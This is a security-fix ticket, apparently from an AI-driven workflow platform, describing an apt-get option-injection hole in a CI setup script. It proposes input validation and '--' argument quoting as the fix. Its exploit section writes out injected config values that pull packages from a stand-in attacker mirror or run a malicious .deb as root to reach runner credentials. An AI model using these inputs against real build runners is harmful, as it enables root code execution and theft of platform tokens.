# Quick Implementation: [Security] Fix 1 MEDIUM severity issue

**Feature Branch**: `AIB-819-security-fix-1`
**Created**: 2026-05-16
**Mode**: Quick Implementation (bypassing formal specification)

## Description

Health scan found 1 MEDIUM severity security issue:

- **.github/scripts/setup-environment.sh:157**: Unquoted, unvalidated user-controlled apt-get install arguments — attacker-controlled .ai-board/config.yml runtime.system_packages entries are passed verbatim to `sudo apt-get install` enabling apt option injection and potential RCE on the centralized workflow runner
  > **Exploit:** ai-board is a multi-tenant platform where any registered user can create a project pointing at a GitHub repo they control, and the speckit/quick-impl workflows centrally execute `setup-environment.sh` against the cloned target repo. The new runtime.system_packages handling reads the array straight from the target repo's .ai-board/config.yml (lib/validations/config.ts:88 only enforces `z.array(z.string().min(1))` — no character or shape restriction) and then runs `sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq $SYSTEM_PACKAGES` with the variable unquoted (shellcheck SC2086 is explicitly disabled). An attacker-controlled config.yml can therefore inject apt-get arguments by starting an entry with `-`, e.g. `system_packages: ['-oDir::Etc::sourcelist=/dev/stdin', 'http://attacker/repo /', 'malicious-pkg']` to source packages from an arbitrary mirror, or `system_packages: ['./payload.deb']` together with a malicious .deb committed to the repo to have dpkg invoke its postinst script as root. The runner holds CLAUDE_CODE_OAUTH_TOKEN, WORKFLOW_API_TOKEN, and GH_PAT in env, so RCE here leaks platform-wide credentials.
  > **Fix:** Validate each system_packages entry against a strict regex of legitimate Debian package names (e.g. `/^[a-z0-9][a-z0-9+.\-]*$/`) in lib/validations/config.ts before the value can reach the shell, and quote/array-pass arguments in setup-environment.sh — for example read the list into a bash array (`mapfile -t SYSTEM_PACKAGES < <(yq eval -o=json '.runtime.system_packages // [] | .[]' ...)`) and invoke `sudo apt-get install -y -qq -- "${SYSTEM_PACKAGES[@]}"` with the `--` separator so any entry starting with `-` is treated as a package name, not an option.

## Implementation Notes

This feature is being implemented via quick-impl workflow, bypassing formal specification and planning phases.

**Quick-impl is suitable for**:
- Bug fixes (typos, minor logic corrections)
- UI tweaks (colors, spacing, text changes)
- Simple refactoring (renaming, file organization)
- Documentation updates

**For complex features**, use the full workflow: INBOX → SPECIFY → PLAN → BUILD

## Implementation

Implementation will be done directly by Claude Code based on the description above.
